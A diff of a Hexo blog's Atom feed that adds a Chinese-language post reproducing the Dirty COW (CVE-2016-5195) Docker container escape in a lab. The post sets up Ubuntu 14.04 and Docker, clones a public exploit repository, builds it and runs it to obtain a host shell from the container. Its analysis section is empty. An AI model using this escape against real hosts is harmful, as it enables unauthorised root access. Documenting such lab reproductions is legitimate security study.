@@ -6,7 +6,7 @@
   <link href="https://liuliuliuzy.github.io/atom.xml" rel="self"/>
   
   <link href="https://liuliuliuzy.github.io/"/>
-  <updated>2021-02-08T13:24:40.390Z</updated>
+  <updated>2021-02-21T08:26:28.081Z</updated>
   <id>https://liuliuliuzy.github.io/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Docker逃逸系列3 dirtycow漏洞利用</title>
+    <link href="https://liuliuliuzy.github.io/2021/02/21/Docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <id>https://liuliuliuzy.github.io/2021/02/21/Docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
+    <published>2021-02-21T02:48:16.000Z</published>
+    <updated>2021-02-21T08:26:28.081Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>Docker逃逸3：利用Linux内核漏洞 dirtycow(CVE-2016-5195) 进行逃逸</p><p>宿主机：ubuntu 14.04</p><p>Docker版本：Docker version 18.06.3-ce, build d7080c1</p></blockquote><h2 id="步骤1、安装虚拟机以及docker以及docker-compose"><a href="#步骤1、安装虚拟机以及docker以及docker-compose" class="headerlink" title="步骤1、安装虚拟机以及docker以及docker-compose"></a>步骤1、安装虚拟机以及docker以及docker-compose</h2><h3 id="镜像下载："><a href="#镜像下载：" class="headerlink" title="镜像下载："></a>镜像下载：</h3><ul><li><a href="http://old-releases.ubuntu.com/releases/14.04.3/ubuntu-14.04.5-desktop-amd64.iso.torrent">http://old-releases.ubuntu.com/releases/14.04.3/ubuntu-14.04.5-desktop-amd64.iso.torrent</a></li></ul><h3 id="docker安装："><a href="#docker安装：" class="headerlink" title="docker安装："></a>docker安装：</h3><p>按照<a href="https://yeasy.gitbook.io/docker_practice/install/ubuntu">文档步骤</a>操作到最后一步，发现docker-ce-cli找不到。经过后来的实际操作结果可知，其实安装的包只需要写到docker-ce就可以了。</p><h3 id="docker-compose安装："><a href="#docker-compose安装：" class="headerlink" title="docker-compose安装："></a>docker-compose安装：</h3><ul><li><a href="https://blog.csdn.net/tianjiewang/article/details/83012635">https://blog.csdn.net/tianjiewang/article/details/83012635</a></li></ul><h2 id="步骤2、启动dirtyCow容器并测试逃逸"><a href="#步骤2、启动dirtyCow容器并测试逃逸" class="headerlink" title="步骤2、启动dirtyCow容器并测试逃逸"></a>步骤2、启动dirtyCow容器并测试逃逸</h2><p>首先复制仓库<strong><a href="https://github.com/gebl/dirtycow-docker-vdso">dirtycow-docker-vdso</a></strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gebl/dirtycow-docker-vdso.git</span><br></pre></td></tr></table></figure><p>然后使用docker-compose创建容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd dirtycow-docker-vdso/</span><br><span class="line">sudo docker-compose run dirtycow /bin/bash</span><br></pre></td></tr></table></figure><p>查看容器ip地址，测试漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">cd /dirtycow-vdso/</span><br><span class="line">make</span><br><span class="line">./0xdeadbeef 172.18.0.3:1234</span><br></pre></td></tr></table></figure><p>于是在容器里就可以看到逃逸到了宿主机的环境，可以执行一系列操作</p><p><img src="本地exp.png" alt="直接从容器内获取shell"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ul><li><a href="https://thinkycx.me/2019-05-20-CVE-2016-5195-dirtycow-recurrence.html">https://thinkycx.me/2019-05-20-CVE-2016-5195-dirtycow-recurrence.html</a></li><li><a href="https://dirtycow.ninja/">https://dirtycow.ninja/</a></li><li><a href="https://blog.paranoidsoftware.com/dirty-cow-cve-2016-5195-docker-container-escape/">https://blog.paranoidsoftware.com/dirty-cow-cve-2016-5195-docker-container-escape/</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;Docker逃逸3：利用Linux内核漏洞 dirtycow(CVE-2016-5195) 进行逃逸&lt;/p&gt;
+&lt;p&gt;宿主机：ubuntu 14.04&lt;/p&gt;
+&lt;p&gt;Docker版本：Docker version 18.06.3-ce, build </summary>
+      
+    
+    
+    
+    <category term="实践记录" scheme="https://liuliuliuzy.github.io/categories/%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/"/>
+    
+    
+    <category term="Docker" scheme="https://liuliuliuzy.github.io/tags/Docker/"/>
+    
+    <category term="Linux kernel" scheme="https://liuliuliuzy.github.io/tags/Linux-kernel/"/>
+    
+  </entry>
   
   <entry>
     <title>Docker逃逸系列2:docker.sock危险挂载</title>
